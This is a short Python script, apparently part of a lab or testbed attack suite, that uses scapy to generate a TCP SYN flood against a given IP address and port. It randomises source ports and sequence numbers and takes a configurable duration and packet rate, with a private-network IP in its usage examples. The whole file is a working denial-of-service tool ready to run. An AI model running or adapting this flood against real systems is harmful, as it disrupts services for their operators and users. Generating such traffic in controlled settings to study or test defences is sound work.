"""SYN flood: many 'let's connect' (SYN) packets that never finish the TCP handshake.

python syn_flood.py 172.29.1.135                     (10 s, 1000 packets/s, port 1884)
python syn_flood.py 172.29.1.135 --seconds 5 --rate 500
"""
import random

from scapy.layers.inet import IP, TCP

from attack_base import Attack, read_arguments


class SynFlood(Attack):
    name = "SYN flood"

    def make_packet(self):
        return IP(dst=self.target) / TCP(sport=random.randint(1024, 65535), dport=self.port,
                                         flags="S", seq=random.randint(0, 2**32 - 1))


if __name__ == "__main__":
    a = read_arguments("SYN flood", default_port=1884)
    SynFlood(a.target, a.port, a.seconds, a.rate).run()
